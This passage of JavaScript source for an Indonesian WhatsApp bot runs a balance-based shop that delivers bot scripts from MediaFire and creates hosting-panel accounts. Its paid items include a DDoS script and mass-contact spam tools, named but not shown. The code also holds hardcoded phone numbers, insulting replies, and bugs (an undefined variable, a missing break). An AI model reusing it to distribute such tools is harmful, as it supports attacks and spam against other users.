       if (cekSaldo(sender,db_saldo) < 35000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp35.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 35000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv2': {
       if (cekSaldo(sender,db_saldo) < 15000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv3': {
       if (cekSaldo(sender,db_saldo) < 25000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 25000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv3subdo': {
       if (cekSaldo(sender,db_saldo) < 30000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 30000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv4': {
       if (cekSaldo(sender,db_saldo) < 35000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp35.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 35000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv5': {
       if (cekSaldo(sender,db_saldo) < 55000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp55.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 55000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv6': {
       if (cekSaldo(sender,db_saldo) < 60000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp60.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 60000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv6subdo': {
       if (cekSaldo(sender,db_saldo) < 70000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp70.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 70000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv7otp': {
       if (cekSaldo(sender,db_saldo) < 75000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp75.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 75000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv7addpm2': {
       if (cekSaldo(sender,db_saldo) < 85000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp85.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 85000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscjagagrupv1': {
       if (cekSaldo(sender,db_saldo) < 10000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 10000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/jaxgd3mdrxjkszb/Sc_Jaga_Grup.zip/file')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscjagagrupv2': {
       if (cekSaldo(sender,db_saldo) < 15000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/fnbxdwor0ldky84/JagaGrup+V2.zip/file')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscpushkontak': {
       if (cekSaldo(sender,db_saldo) < 10000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 10000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/xdh4ocswkkt7tt2/BotSaveContact.zip/file')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyschwv191': {
       if (cekSaldo(sender,db_saldo) < 20000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 20000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyschwv192': {
       if (cekSaldo(sender,db_saldo) < 25000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 25000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyschwv201': {
       if (cekSaldo(sender,db_saldo) < 30000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 30000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyschwv202': {
       if (cekSaldo(sender,db_saldo) < 45000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 45000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break               
         case 'buyscpushautosave': {
       if (cekSaldo(sender,db_saldo) < 15000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/yousxcwwv5cjj0p/SC+PUSH+SIMPLE+BY+RAFATHAR+OFFCIAL.zip/file')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscvps1': {
       if (cekSaldo(sender,db_saldo) < 50000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp50.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 50000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscvps2': {
       if (cekSaldo(sender,db_saldo) < 80000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp80.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 80000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscjpmv1': {
       if (cekSaldo(sender,db_saldo) < 15000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/bdtbszlg69old31/Jpm+X+PushKntk+V1.zip/file')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscjpmv2': {
       if (cekSaldo(sender,db_saldo) < 20000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 20000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/ilam1m6wsgxqh6b/Jpm+X+PushKntk+V2.zip/file')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscjpmv3': {
       if (cekSaldo(sender,db_saldo) < 25000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 25000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/o1sj4k0aeb2frm0/Jpm+X+PushKntk+V3.zip/file')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscthemav1': {
       if (cekSaldo(sender,db_saldo) < 10000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 10000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscthemav2': {
       if (cekSaldo(sender,db_saldo) < 15000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscnowa': {
       if (cekSaldo(sender,db_saldo) < 20000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 20000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscwebp': {
       if (cekSaldo(sender,db_saldo) < 10000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 10000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/i5fgc58laqm1vp8/SC+BOT+WEBP.zip/file')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buysctesmoni': {
       if (cekSaldo(sender,db_saldo) < 15000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscddos': {
       if (cekSaldo(sender,db_saldo) < 20000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 20000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscbukaenc': {
       if (cekSaldo(sender,db_saldo) < 15000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buymodule': {
       if (cekSaldo(sender,db_saldo) < 15000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscpm2': {
       if (cekSaldo(sender,db_saldo) < 45000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 45000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
   case 'bukti':{
           let jumlah = args[0]
           if (!jumlah) return reply('Jumblah nya?')
reply('OKE KAK DEPOSIT SEDANG DI PROSES MOHON MENUNGGU SAMPAI OWNER MENGKONFIRMASI DEPOSIT TERSEBUT')
DitzzXploit.sendMessage(`${owner}@s.whatsapp.net`, { text: `*ADA YANG DEPOSIT NIH*\n*SEJUMLAH ${jumlah} DARI @${sender.split('@')[0]}*\n*INGIN ACC DEPOSIT? KETIK*\n*${prefix}acc MAU NOLAK? BIARIN AJA*`, mentions: [sender]}, { quoted: hw })
        }
        break
           case 'reportbug':{
           let ripotbug = args[0]
           if (!ripotbug) return reply('Teksnya?')
reply('Oke Kak Reportmu Sudah Terkirim Ke Owner')
DitzzXploit.sendMessage('6283183432282@s.whatsapp.net', { text: `*===[ REPORT ]===*\n*TEXT : ${jumlah} DARI : @${sender.split('@')[0]}*\n*Ketik ${prefix}accreport Jika Ingin Menerima Laporan*\n*${prefix}acc Jika Ingin Menolak Report Biarin Ajah 🗿*`, mentions: [sender]}, { quoted: hw })
        }
        break
        case 'accreport': {
                    let messageText = `_Terima Kasih Atas Laporan Anda Dan Laporan Anda Diterima Tunggu 1 - 2 Hari Agar Owner Bisa Memperbaikinya`
  let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;

  DitzzXploit.sendMessage(targetNumber, {
    text: `*${messageText}*`,
    mentions: [sender]
  }, {
    quoted: hw
  }).then(() => {
    m.reply('Acc berhasil!');
  }).catch(() => {
    m.reply('Gagal mengirim pesan!');
  });
}
break
                case 'saldo':{
reply(`*━━ CHECK YOUR INFO ━━*

 _• *Name:* ${pushname}_
 _• *Nomer:* ${sender.split('@')[0]}_
 _• *Saldo:* Rp${toRupiah(cekSaldo(sender, db_saldo))}_

*Note :*
_Saldo hanya bisa untuk beli di bot_
_Tidak bisa ditarik atau transfer_!`)
}
break
          case 'qris': {
DitzzXploit.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/e725b89efe293f156b9bb.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
case 'orkut': {
DitzzXploit.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/e725b89efe293f156b9bb.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
case 'dana': {
DitzzXploit.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/940aef6a0b187dc4a6a18.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
          case 'bri': {
DitzzXploit.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/16455c651bb586fc20443.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
case "deposit":
        depo = `PILIH PAYMENT DEPOSIT DIBAWAH DAN SEBUTKAN NOMINALNYA
contoh : ${prefix}dana 5000

${prefix}dana✅
${prefix}qris✅
${prefix}bri✅
${prefix}orkut✅
${prefix}gopay❎`
        DitzzXploit.sendMessage(from, {text : depo}, {quoted : hw}) 
        break      
    case "buyvps": {
const owned = `0@s.whatsapp.net`
const version = require("baileys/package.json").version
const textsrv = `*Hi @${sender.split("@")[0]} 👋*
*── 「 Pedia Official 」 ──*				   	
• *Saldo:* _Rp${toRupiah(cekSaldo(sender, db_saldo))}_
• *Name:* ${pushname}
• *Id*: _${sender.replace("@s.whatsapp.net", "")}_
  
   *｢ LIST VPS DIGITALOCEAN ｣*
⭔●${prefix}buypaketvps1g1c
⭔●${prefix}buypaketvps2g1c
⭔●${prefix}buypaketvps2g2c
⭔●${prefix}buypaketvps4g2c
⭔●${prefix}buypaketvps8g4c

_*NOTE:*_ pilih salah satu yang saldo kamu cukup

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: textsrv, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
    case "buysrv": {
const owned = `0@s.whatsapp.net`
const version = require("baileys/package.json").version
const textsrv = `*Hi @${sender.split("@")[0]} 👋*
*── 「 Pedia Official 」 ──*				   	
• *Saldo:* _Rp${toRupiah(cekSaldo(sender, db_saldo))}_
• *Name:* ${pushname}
• *Id*: _${sender.replace("@s.whatsapp.net", "")}_
  
   *｢ LIST SERVER ｣*
⭔●${prefix}srvpaket1 _*Ram 1GB/1GB*_
⭔●${prefix}srvpaket2 _*Ram 2GB/2GB*_
⭔●${prefix}srvpaket3 _*Ram 3GB/3GB*_
⭔●${prefix}srvpaket4 _*Ram 4GB/4GB*_
⭔●${prefix}srvpaket5 _*Ram 5GB/5GB*_
⭔●${prefix}srvpaket6 _*Ram UNLI/UNLI*_
⭔●${prefix}srvpaket7 _*Ram 6GB/6GB*_
⭔●${prefix}srvpaket8 _*Ram 7GB/7GB*_
⭔●${prefix}srvpaket9 _*Ram 8GB/8GB*_
⭔●${prefix}srvpaket10 _*Ram 9GB/9GB*_

_*NOTE:*_ pilih salah satu yang saldo kamu cukup

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: textsrv, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
                case 'acc': case 'addsaldo':{
if (!isOwner) return reply('NGAPAIN YATIM JAHANAM?')
if (!q.split(",")[0]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
addSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
reply(`「 *SALDO USER* 」
⭔ID: @${sender.split("@")[0]}
⭔Nomer: @${q.split(",")[0]}
⭔Tanggal: ${tanggal}
⭔Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
                }
        case 'kirim': {
                    let messageText = `DONE KAK DEPOSIT SUDAH BERHASIL SEJUMLAH  ${q.split(",")[1]} TELAH DITAMBAHKAN KE SALDO ANDA CEK SALDO KETIK .SALDO TERIMAKASIH`
  let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;

  DitzzXploit.sendMessage(targetNumber, {
    text: `*${messageText}*`,
    mentions: [sender]
  }, {
    quoted: hw
  }).then(() => {
    m.reply('Acc Berhasil Tuan✅');
  }).catch(() => {
    m.reply('Gagal mengirim pesan!');
  });
}
break;
        //Diatas case kirim jangan dihapus ntr error
        //bagian panel
        case 'buyakn':{
if (cekSaldo(sender,db_saldo) < 2000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp2.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!q.split(',')[0]) return reply(`Ex : ${prefix+command} email,username\n\nContoh :\n${prefix+command} contoh@gmail.com,contoh`)
if (!q.split(',')[1]) return reply(`Ex : ${prefix+command} email,username\n\nContoh :\n${prefix+command} contoh@gmail.com,contoh`)
let d = (await DitzzXploit.onWhatsApp(sender.split('@')[0]))[0] || {}
let psswd = d.exists ? require("crypto").randomBytes(5).toString('hex') : username+'7739'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": q.split(',')[0],
"username": q.split(',')[1],
"first_name": q.split(',')[1],
"last_name": "Memb",
"language": "en",
"password": psswd
})
})
let res = await f.json();
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2));
DitzzXploit.sendMessage(from, { text: `*SUCCESSFULLY BUY USER*\n\n*TYPE:* user\n\n*ID:* ${res.attributes.id}\n*UUID:* ${res.attributes.uuid}\n*USERNAME:* ${res.attributes.username}\n*EMAIL:* ${res.attributes.email}\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n*CREATED AT:* ${res.attributes.created_at}\n\n*Password telah dikirim ke @${sender.split('@')[0]}*`, mentions: [sender]}, { quoted: m })
    DitzzXploit.sendMessage(sender, { text: `*BERIKUT DATA AKUN ANDA*\n\n*EMAIL:* ${res.attributes.email}\n*USERNAME:* ${res.attributes.username}\n*PASSWORD:* ${psswd}\n*LOGIN:* ${domain}\n\n*NOTE*\n_*BOT* atau *CLIENT Pedia Official* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\nUntuk Membeli server ketik ${prefix}buysrv ya\n\n#TERIMAKASIH`,})
}    
        
        break
        case "panel": {
        let t = text.split(',');
        if (t.length < 2) reply(`salah Goblok`)
const owned = `6283842671582@s.whatsapp.net`
const username = t[0];
const u = t[1];
const text12 = `*Hi @${sender.split("@")[0]} 👋*

RAFATHAR 
BY Pedia Official

CARA ADD USER PANEL :
ram user,nomer

contoh : 1gb Zans,6285877276864

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
let sections = [{
title: 'List Menu',
highlight_label: 'All Menu Lists',
rows: [{
title: '1gb',
description: `Ram 1gb/cpu50%`, 
id: `.1gb ${username}`
},
{
title: 'Semuah menu',
description: `Menampilkan Seluruh menu`, 
